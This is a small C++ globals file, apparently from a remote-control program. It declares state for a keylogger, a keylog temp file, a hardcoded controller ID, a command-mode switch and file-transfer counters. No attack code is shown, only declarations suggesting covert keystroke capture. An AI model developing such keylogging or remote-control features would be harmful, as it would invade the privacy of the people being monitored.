#include "globals.h"

bool isKeyLoggerRunning = false;
bool isConversationRunning = false;
const int64_t sashaId = 1041837892;

/*
If the current mode is STANDARD, it means that this is a normal mode:
we can write commands, but if it is not STANDARD, it means that
the program will not accept commands, but will accept what
the mode is set to (path to folder, flags for executing subtasks, etc.)
*/

const std::string klFilename = "kltemp.txt";
Mode currentMode = Mode::STANDARD;
bool isWaitingForFile = false;
bool isMusicPlaying = false;

unsigned long totalFileNameLength = 0;
unsigned int totalFileNumber = 0;
unsigned long long totalFileSize = 0;